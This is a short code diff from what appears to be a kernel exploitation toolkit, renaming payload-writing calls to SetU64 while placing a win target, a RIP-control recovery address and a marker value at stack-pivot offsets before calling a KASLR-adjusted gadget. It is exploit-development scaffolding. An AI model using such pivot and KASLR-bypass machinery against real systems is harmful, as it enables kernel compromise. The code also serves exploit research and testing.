@@ -133,9 +133,9 @@ public:
         pivot->ApplyToPayload(p, kaslr);
 
         auto offs = pivot->GetDestinationOffset();
-        p.Set(offs, xdk.WinTarget());
-        p.Set(offs + 8, xdk.GetRipControlRecoveryAddr());
-        p.Set(offs + 16, 0xffffffff41414141);
+        p.SetU64(offs, xdk.WinTarget());
+        p.SetU64(offs + 8, xdk.GetRipControlRecoveryAddr());
+        p.SetU64(offs + 16, 0xffffffff41414141);
 
         auto buf_addr = xdk.AllocBuffer(p.GetData(), true);
         xdk.CallAddr(kaslr + pivot->GetGadgetOffset(), { { buf_reg, buf_addr } });
